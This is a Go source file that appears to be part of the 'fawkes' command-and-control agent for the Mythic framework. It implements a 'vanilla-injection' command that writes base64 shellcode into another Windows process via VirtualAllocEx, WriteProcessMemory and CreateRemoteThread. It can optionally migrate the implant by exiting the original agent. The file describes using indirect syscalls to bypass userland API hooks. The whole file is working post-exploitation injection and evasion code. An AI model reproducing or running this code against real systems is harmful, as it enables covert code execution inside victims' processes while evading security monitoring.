//go:build windows
// +build windows

// Package commands provides the vanilla-injection command for remote process injection.
//
// This command performs classic remote process injection using:
// - OpenProcess/NtOpenProcess: Opens a handle to the target process
// - VirtualAllocEx/NtAllocateVirtualMemory: Allocates RW memory in the target
// - WriteProcessMemory/NtWriteVirtualMemory: Writes shellcode to allocated memory
// - VirtualProtectEx/NtProtectVirtualMemory: Changes memory to RX (W^X enforcement)
// - CreateRemoteThread/NtCreateThreadEx: Creates a thread to execute the shellcode
//
// Automatically dispatches to indirect syscalls (Nt* via ntdll gadgets) when available,
// bypassing userland API hooks.
package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"runtime"
	"strings"
	"syscall"
	"time"

	"fawkes/pkg/structs"
)

const (
	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_READ           = 0x0010

	MEM_COMMIT        = 0x1000
	MEM_RESERVE       = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE    = 0x04
)

var (
	kernel32               = syscall.NewLazyDLL("kernel32.dll")
	procVirtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
	procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
	procOpenProcess        = kernel32.NewProc("OpenProcess")
	procCloseHandle        = kernel32.NewProc("CloseHandle")
)

// VanillaInjectionCommand implements the vanilla-injection command
type VanillaInjectionCommand struct{}

// Name returns the command name
func (c *VanillaInjectionCommand) Name() string {
	return "vanilla-injection"
}

// Description returns the command description
func (c *VanillaInjectionCommand) Description() string {
	return "Perform vanilla remote process injection using VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread"
}

// VanillaInjectionParams represents the parameters for vanilla-injection
type VanillaInjectionParams struct {
	ShellcodeB64 string `json:"shellcode_b64"` // Base64-encoded shellcode bytes
	PID          int    `json:"pid"`           // Target process ID
	Action       string `json:"action"`        // "inject" (default) or "migrate"
}

// isMigrateAction returns true if the action is a process migration.
func isMigrateAction(action string) bool {
	return strings.EqualFold(action, "migrate")
}

// Execute executes the vanilla-injection command
func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResult {
	if runtime.GOOS != "windows" {
		return errorResult("Error: This command is only supported on Windows")
	}

	var params VanillaInjectionParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if params.ShellcodeB64 == "" {
		return errorResult("Error: No shellcode data provided")
	}

	if params.PID <= 0 {
		return errorResult("Error: Invalid PID specified")
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return errorf("Error decoding shellcode: %v", err)
	}

	if len(shellcode) == 0 {
		return errorResult("Error: Shellcode data is empty")
	}

	output := fmt.Sprintf("[*] Received shellcode: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", params.PID)

	if IndirectSyscallsAvailable() {
		output += "[*] Using indirect syscalls (calls originate from ntdll)\n"
	} else {
		output += "[*] Using standard Win32 API calls\n"
	}

	// Step 1: Open handle to target process
	desiredAccess := uint32(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)

	hProcess, err := injectOpenProcess(desiredAccess, uint32(params.PID))
	if err != nil {
		return errorResult(output + fmt.Sprintf("[!] %v\n", err))
	}
	defer injectCloseHandle(hProcess)
	output += "[+] Successfully opened process handle\n"

	// Step 2-4: Allocate RW, write shellcode, protect RX (W^X enforcement)
	remoteAddr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
	if err != nil {
		return errorResult(output + fmt.Sprintf("[!] %v\n", err))
	}
	output += fmt.Sprintf("[+] Shellcode written to 0x%X (RW→RX)\n", remoteAddr)

	// Step 5: Create remote thread
	hThread, err := injectCreateRemoteThread(hProcess, remoteAddr)
	if err != nil {
		return errorResult(output + fmt.Sprintf("[!] %v\n", err))
	}
	injectCloseHandle(hThread)

	output += fmt.Sprintf("[+] Remote thread created (handle: 0x%X)\n", hThread)
	output += "[+] Vanilla injection completed successfully\n"

	// If this is a migrate action, exit the current agent after injection
	if isMigrateAction(params.Action) {
		output += "[*] Migration mode: injected payload into target process\n"
		output += "[*] Scheduling agent exit in 5 seconds to allow response delivery...\n"
		go func() {
			// Give enough time for the response to be sent back to Mythic
			// and for the new agent instance to start checking in
			time.Sleep(5 * time.Second)
			log.Printf("process migration complete — exiting original agent")
			os.Exit(0)
		}()
	}

	return successResult(output)
}
